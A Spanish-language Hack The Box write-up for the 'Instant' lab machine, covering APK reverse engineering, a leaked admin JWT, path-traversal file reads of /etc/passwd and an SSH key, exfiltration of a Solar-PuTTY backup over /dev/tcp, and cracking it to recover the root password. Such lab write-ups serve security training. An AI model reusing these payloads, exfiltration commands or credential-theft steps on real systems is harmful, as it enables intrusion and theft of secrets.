---
title: Instant
description: Instant es una máquina de dificultad media que incluye ingeniería inversa de una aplicación móvil, explotación de endpoints de API y descifrado de hashes y archivos cifrados. Los jugadores analizarán un APK para extraer información confidencial y un token de autorización codificado. Posteriormente, explotarán un endpoint de API vulnerable a la lectura arbitraria de archivos. Finalmente, comprometerán completamente el sistema descifrando y analizando los datos de sesión cifrados de Solar-PuTTY.
date: 2024-12-14
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-instant/instant_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - ssh
  - http
  - tcp
  - apk
  - api
  - data_leaks
  - lfi
  - password_attacks
  - information_gathering
  - web_analysis
  - vulnerability_exploitation
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/instant:-$ ping -c 1 10.10.11.37
PING 10.10.11.37 (10.10.11.37) 56(84) bytes of data.
64 bytes from 10.10.11.37: icmp_seq=1 ttl=63 time=252 ms

--- 10.10.11.37 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 252.479/252.479/252.479/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/instant:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.37 -oG nmap1
Host: 10.10.11.37 ()	Status: Up
Host: 10.10.11.37 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/instant:-$ sudo nmap -sCV -p22,80 -vvv 10.10.11.37 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMM6fK04LJ4jNNL950Ft7YHPO9NKONYVCbau/+tQKoy3u7J9d8xw2sJaajQGLqTvyWMolbN3fKzp7t/s/ZMiZNo=
|   256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL+zjgyGvnf4lMAlvdgVHlwHd+/U4NcThn1bx5/4DZYY
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://instant.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/htb/machines/instant:-$ echo '10.10.11.37\tinstant.htb' | sudo tee -a /etc/hosts
```
```terminal
/home/kali/Documents/htb/machines/instant:-$ whatweb instant.htb
http://instant.htb [200 OK] Apache[2.4.58], Bootstrap[4.0.0], Country[RESERVED][ZZ], Email[support@instant.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[10.10.11.37], JQuery[3.2.1], Script, Title[Instant Wallet]
```

---
## Web Analysis

Encuentro una web sin mucho contenido. El botón principal, me permite descargar un APK.

![](assets/img/htb-writeup-instant/instant1_1.png)

Descomprimo el archivo con apktool.

```terminal
/home/kali/Documents/htb/machines/instant:-$ apktool d instant.apk
```
Busco referencias al dominio dentro del código descompilado, e identifico dos subdominios.

```
/home/kali/Documents/htb/machines/instant/instant:-$ grep -r "instant.htb"
smali/com/instantlabs/instant/TransactionActivity.smali:    const-string v0, "http://mywalletv1.instant.htb/api/v1/initiate/transaction"
smali/com/instantlabs/instant/RegisterActivity.smali:    const-string p4, "http://mywalletv1.instant.htb/api/v1/register"
smali/com/instantlabs/instant/ProfileActivity.smali:    const-string v7, "http://mywalletv1.instant.htb/api/v1/view/profile"
smali/com/instantlabs/instant/TransactionActivity$2.smali:    const-string v1, "http://mywalletv1.instant.htb/api/v1/confirm/pin"
smali/com/instantlabs/instant/LoginActivity.smali:    const-string v1, "http://mywalletv1.instant.htb/api/v1/login"
smali/com/instantlabs/instant/AdminActivities.smali:    const-string v2, "http://mywalletv1.instant.htb/api/v1/view/profile"
res/xml/network_security_config.xml:        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
res/xml/network_security_config.xml:        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
res/layout/activity_forgot_password.xml:        <TextView android:textSize="14.0sp" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_margin="25.0dip" android:text="Please contact support@instant.htb to have your account recovered" android:fontFamily="sans-serif-condensed" android:textAlignment="center" />
```
```terminal
/home/kali/Documents/htb/machines/instant:-$ echo '10.10.11.37\tinstant.htb\tmywalletv1.instant.htb\tswagger-ui.instant.htb' | sudo tee -a /etc/hosts
```

![](assets/img/htb-writeup-instant/instant1_2.png)
![](assets/img/htb-writeup-instant/instant1_3.png)

---
## Vulnerability Exploitation

Al analizar los archivos descompilados, encuentro un JWT con privilegios elevados.

```terminal
/home/kali/Documents/htb/machines/instant/instant:-$ cat smali/com/instantlabs/instant/AdminActivities.smali
```

![](assets/img/htb-writeup-instant/instant1_4.png)
![](assets/img/htb-writeup-instant/instant1_5.png)

Utilizo el JWT y confirmo que permite acceder a información restringida.

```terminal
/home/kali/Documents/htb/machines/instant:-$ curl -s --path-as-is -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=1.log" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" | jq
{
  "/home/shirohige/logs/1.log": [
    "This is a sample log testing\n"
  ],
  "Status": 201
}
```

Identifico que el parámetro `log_file_name` es vulnerable a LFI.

```terminal
/home/kali/Documents/htb/machines/instant:-$ curl -s --path-as-is -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" | jq | grep bash

"root:x:0:0:root:/root:/bin/bash\n",
"shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash\n",
```

Extraigo la clave `id_rsa` del usuario identificado previamente.

```terminal
/home/kali/Documents/htb/machines/instant:-$ curl -s --path-as-is -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2F..%2Fhome/shirohige/.ssh/id_rsa" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" | jq '.["/home/shirohige/logs/../../../../../home/shirohige/.ssh/id_rsa"][]' | tr -d '"' | sed 's/\\n//' > id_rsa
```

Configuro los permisos y accedo al sistema como `shirohige`.

```terminal
/home/kali/Documents/htb/machines/instant:-$ chmod 600 id_rsa
/home/kali/Documents/htb/machines/instant:-$ ssh shirohige@instant.htb -i id_rsa

shirohige@instant:~$ id
uid=1001(shirohige) gid=1002(shirohige) groups=1002(shirohige),1001(development)

shirohige@instant:~$ cat user.txt
```

---
## Privilege Escalation

Busco archivos pertenecientes al usuario `shirohige` y encuentro un directorio en `/opt/backups` con un archivo relacionado con Solar-PuTTY.

```terminal
shirohige@instant:~$ find / -user shirohige 2>/dev/null | grep -vE "shirohige|proc|cgroup|run"
/dev/pts/0
/opt/backups
/opt/backups/Solar-PuTTY
/opt/backups/Solar-PuTTY/sessions-backup.dat
```
```terminal
/home/kali/Documents/htb/machines/instant:-$ nc -lnvp 4444 > sessinos-backup.dat
	listening on [any] 4444 ...
```

Envío el archivo a mi máquina.

```terminal
shirohige@instant:~$ cat /opt/backups/Solar-PuTTY/sessions-backup.dat > /dev/tcp/10.10.16.79/4444
```
```terminal
	... connect to [10.10.16.79] from (UNKNOWN) [10.10.11.37] 57220
```

Descargo un script para descifrar las credenciales almacenadas en Solar-PuTTY, y lo ejecuto utilizando `rockyou.txt` como diccionario.

```terminal
/home/kali/Documents/htb/machines/instant:-$ wget https://gist.githubusercontent.com/xHacka/052e4b09d893398b04bf8aff5872d0d5/raw/8e76153cd2d115686a66408f6e2deff7d3740ecc/SolarPuttyDecrypt.py

/home/kali/Documents/htb/machines/instant:-$ python3 SolarPuttyDecrypt.py sessinos-backup.dat /usr/share/wordlists/rockyou.txt
[103] password='estrella'

{"Sessions":[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b-b721-da76cbe8ed04","AuthenticateScript":"00000000-0000-0000-0000-000000000000","LastTimeOpen":"0001-01-01T00:00:00","OpenCounter":1,"SerialLine":null,"Speed":0,"Color":"#FF176998","TelnetConnectionWaitSeconds":1,"LoggingEnabled":false,"RemoteDirectory":""}],"Credentials":[{"Id":"452ed919-530e-419b-b721-da76cbe8ed04","CredentialsName":"instant-root","Username":"root","Password":"12**24nzC!r0c%q12","PrivateKeyPath":"","Passphrase":"","PrivateKeyContent":null}],"AuthScript":[],"Groups":[],"Tunnels":[],"LogsFolderDestination":"C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"}
```

Utilizo la contraseña obtenida para cambiar acceder al usuario `root`.

```terminal
shirohige@instant:~$ su root
Password: 12**24nzC!r0c%q12

root@instant:/home/shirohige# cat /root/root.txt
```

> <a href="https://labs.hackthebox.com/achievement/machine/1521382/630" target="_blank">***Litio7 has successfully solved Instant from Hack The Box***</a>
{: .prompt-info style="text-align:center" }
